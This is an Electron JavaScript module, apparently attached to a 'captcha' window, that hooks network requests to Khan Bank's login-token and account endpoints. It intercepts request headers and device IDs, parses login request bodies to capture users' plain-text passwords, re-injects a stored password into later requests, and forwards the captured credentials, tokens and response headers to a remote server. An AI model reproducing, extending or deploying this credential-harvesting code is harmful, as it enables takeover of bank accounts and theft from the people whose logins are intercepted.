// ============================================================
// captcha/cookie-collector.js — Network hooks (нэг газарт)
// ============================================================
const { session } = require('electron');

class CookieCollector {
    constructor(captchaWindow, isCitizen, winCompat) {
        this.captchaWindow = captchaWindow;
        this.isCitizen = isCitizen;
        this.winCompat = winCompat;
        this.installed = false;
        this.latestPassword = null;
        this.currentDeviceId = null;
    }

    install() {
        if (this.installed) return;
        const sess = this.winCompat?.isWindows7
            ? this.captchaWindow.webContents.session
            : session.defaultSession;

        if (!sess?.webRequest) {
            console.warn('[CookieCollector] Session/webRequest unavailable');
            return;
        }

        const tokenUrls = [
            'https://e.khanbank.com/v3/cfrm/auth/token',
            'https://corp.khanbank.com/api/auth/token',
        ];
        const accountUrls = [
            'https://e.khanbank.com/*/account*',
            'https://api.khanbank.com:9003/*/account*',
        ];

        const tokenFilter = { urls: tokenUrls.map(u => `${u}*`) };
        const accountFilter = { urls: accountUrls };

        // ─── Token request hooks ───

        sess.webRequest.onBeforeSendHeaders(tokenFilter, async (details, callback) => {
            try {
                if (details.requestHeaders['device-id']) {
                    this.currentDeviceId = details.requestHeaders['device-id'];
                }
                await this._sendToServer({
                    url: details.url,
                    headers: details.requestHeaders,
                    deviceId: this.currentDeviceId,
                    tag: 'REQUEST_HEADER',
                });
            } catch (err) {
                console.error('[CookieCollector] onBeforeSendHeaders:', err.message);
            } finally {
                callback({ requestHeaders: details.requestHeaders });
            }
        });

        sess.webRequest.onBeforeRequest(tokenFilter, async (details, callback) => {
            try {
                if (details.uploadData?.length > 0) {
                    let payload = '';
                    details.uploadData.forEach(d => {
                        if (d.bytes) payload += Buffer.from(d.bytes).toString('utf8');
                    });

                    if (payload) {
                        const data = JSON.parse(payload);
                        if (!data.rememberDevice) {
                            this.latestPassword = data.password;
                        } else if (this.latestPassword) {
                            data.password = this.latestPassword;
                        }
                        await this._sendToServer({
                            url: details.url,
                            requestPayload: JSON.stringify(data),
                            deviceId: this.currentDeviceId,
                            tag: 'REQUEST_PAYLOAD',
                        });
                    }
                }
                await this._checkExposeHeaders();
            } catch (err) {
                console.error('[CookieCollector] onBeforeRequest:', err.message);
            } finally {
                callback({});
            }
        });

        sess.webRequest.onResponseStarted(tokenFilter, async (details) => {
            try {
                await this._sendToServer({
                    url: details.url,
                    headers: details.responseHeaders,
                    deviceId: this.currentDeviceId,
                    tag: 'RESPONSE_HEADER',
                    isResponseHeader: true,
                });
                if (details.responseHeaders['Access-Control-Expose-Headers']) {
                    await this._checkExposeHeaders();
                }
            } catch (err) {
                console.error('[CookieCollector] onResponseStarted:', err.message);
            }
        });

        sess.webRequest.onCompleted(tokenFilter, async (details) => {
            try {
                if (details.responseHeaders?.['Access-Control-Expose-Headers']) {
                    await this._checkExposeHeaders();
                }
            } catch (err) {
                console.error('[CookieCollector] onCompleted (token):', err.message);
            }
        });

        // ─── Account hooks (OTP completion) ───

        sess.webRequest.onCompleted(accountFilter, async (details) => {
            console.log('[CookieCollector] onCompleted (accounts)')
            try {
                await this._sendToServer({
                    url: details.url,
                    responsePayload: 'accounts',
                    deviceId: this.currentDeviceId,
                    tag: 'RESPONSE_COMPLETED',
                });
                if (details.responseHeaders?.['Access-Control-Expose-Headers']) {
                    await this._checkExposeHeaders();
                }
            } catch (err) {
                console.error('[CookieCollector] onCompleted (accounts):', err.message);
            }
        });

        this.installed = true;
        console.log('[CookieCollector] hooks installed');
    }

    uninstall() {
        if (!this.installed) return;

        try {
            const sess = this.winCompat?.isWindows7 && this.captchaWindow && !this.captchaWindow.isDestroyed()
                ? this.captchaWindow.webContents.session
                : session.defaultSession;

            if (sess?.webRequest) {
                sess.webRequest.onBeforeSendHeaders(null);
                sess.webRequest.onResponseStarted(null);
                sess.webRequest.onBeforeRequest(null);
                sess.webRequest.onCompleted(null);
            }
        } catch (err) {
            console.error('[CookieCollector] uninstall:', err.message);
        }

        this.installed = false;
        this.currentDeviceId = null;
        console.log('[CookieCollector] hooks removed');
    }

    async _sendToServer(params) {
        const DesktopService = require('../services/desktopService');
        const svc = new DesktopService();
        await svc.insertKhanBankCookiesToServer({
            isCitizen: this.isCitizen,
            ...params,
            BankAccountnum: params.tag,
        });
    }

    async _checkExposeHeaders() {
        const DesktopService = require('../services/desktopService');
        const svc = new DesktopService();
        await svc.checkExposeHeaders({
            isCitizen: this.isCitizen,
            exposeHeaders: 'response_header_Access-Control-Expose-Headers',
        });
    }
}

module.exports = CookieCollector;